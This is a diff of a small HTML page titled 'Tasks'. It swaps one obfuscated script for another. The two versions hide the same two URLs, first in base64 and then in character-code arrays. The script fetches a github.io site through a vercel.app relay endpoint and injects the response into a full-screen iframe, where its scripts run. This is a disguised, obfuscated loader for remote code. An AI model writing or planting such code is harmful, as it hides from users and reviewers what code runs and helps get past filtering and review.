@@ -1,49 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Tasks</title>
-<style>
-html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#111;color:#fff;font-family:sans-serif}
-#x1{width:100%;height:100%;border:none}
-#x2{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
-</style>
-</head>
-<body>
+```html
+<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport"content="width=device-width,initial-scale=1"><title>Tasks</title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#111;color:#fff;font-family:sans-serif}#x1{width:100%;height:100%;border:0}#x2{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}</style></head><body><div id="x2">Loading...</div><iframe id="x1"></iframe><script>
+(()=>{const
+_=[
+104,116,116,112,115,58,47,47,110,101,116,119,111,114,107,45,110,105,110,101,45,97,108,112,104,97,46,118,101,114,99,101,108,46,97,112,112,
+99,111,114,101,45,108,111,103,105,99,45,117,116,105,108,115,46,103,105,116,104,117,98,46,105,111
+],
+$=x=>String.fromCharCode(...x),
+A=$(_.slice(0,37)),
+B=$(_.slice(37)),
+C=x=>encodeURIComponent(x),
+D=x=>document.getElementById(x),
+E=D("x2"),
+F=D("x1"),
+G=A+"/api/relay?url="+C(B);
 
-<div id="x2">Loading...</div>
-<iframe id="x1"></iframe>
-
-<script>
-(function(){
-    const _0x4f = function(s){return decodeURIComponent(escape(atob(s)))};
-
-    const A = _0x4f("aHR0cHM6Ly9uZXR3b3JrLW5pbmUtYWxwaGEudmVyY2VsLmFwcA=="); 
-    const B = _0x4f("aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==");
-
-    const C = A + "/api/relay?url=" + encodeURIComponent(B);
-
-    fetch(C).then(function(D){
-        if(!D.ok) throw new Error("x");
-        return D.text();
-    }).then(function(E){
-        document.getElementById("x2").style.display="none";
-
-        let F = E;
-        if(F.indexOf("<head>")!==-1){
-            F = F.replace("<head>","<head><base href=\"" + B + "/\">");
-        } else {
-            F = "<base href=\"" + B + "/\">" + F;
-        }
-
-        document.getElementById("x1").srcdoc = F;
-    }).catch(function(G){
-        console.log("x",G);
-        document.getElementById("x2").innerText="Failed.";
-    });
+fetch(G)
+.then(x=>{if(!x.ok)throw 0;return x.text()})
+.then(x=>{
+ E.style.display="none";
+ let y=x,z="<head>",q='<base href="'+B+'/">';
+ ~x.indexOf(z)?y=x.replace(z,z+q):y=q+x;
+ F.srcdoc=y
+})
+.catch(x=>{
+ console.log("x",x);
+ E.innerText="Failed."
+})
 })();
-</script>
-
-</body>
-</html>
+</script></body></html>
+```
